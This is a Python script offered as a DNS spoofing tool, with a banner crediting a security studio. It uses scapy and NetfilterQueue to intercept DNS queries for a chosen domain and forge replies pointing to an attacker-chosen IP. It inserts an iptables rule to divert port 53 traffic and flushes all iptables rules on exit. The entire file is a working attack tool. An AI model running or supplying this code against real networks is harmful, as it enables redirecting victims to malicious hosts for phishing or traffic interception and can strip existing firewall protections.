# -*- coding: UTF-8 -*-

import argparse
from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

bannerText="""
██╗  ██╗██╗   ██╗ █████╗ ███╗   ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗
╚██╗██╔╝██║   ██║██╔══██╗████╗  ██║    ██║  ██║██║   ██║████╗  ██║
 ╚███╔╝ ██║   ██║███████║██╔██╗ ██║    ███████║██║   ██║██╔██╗ ██║
 ██╔██╗ ██║   ██║██╔══██║██║╚██╗██║    ██╔══██║██║   ██║██║╚██╗██║
██╔╝ ██╗╚██████╔╝██║  ██║██║ ╚████║    ██║  ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                                                 

DNS欺骗 by 玄魂工作室
微信订阅号 : xuanhun521
Github  : https://github.com/xuanhun                                                                                     
    """



from netfilterqueue import NetfilterQueue
from scapy.all import *
import os


def packageHandle(packet):
    payload = packet.get_payload()
    pkt = IP(payload)
    
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        if domain in pkt[DNS].qd.qname:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=targetIp))
            packet.set_payload(str(spoofed_pkt))
            packet.accept()
        else:
            packet.accept()

def main():
    q = NetfilterQueue()
    q.bind(1, packageHandle)
    try:
        q.run() # Main loop
    except KeyboardInterrupt:
        q.unbind()
        os.system('iptables -F')
        os.system('iptables -X')
            


if __name__ == '__main__':

    print(bannerText)

    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
    parser = argparse.ArgumentParser("")
    parser.add_argument("-d", "--domain", help="目标域名", required=True)
    parser.add_argument("-t", "--target", help="虚假ips", required=True)

    args = parser.parse_args()
    targetIp = args.target
    domain = args.domain
    main()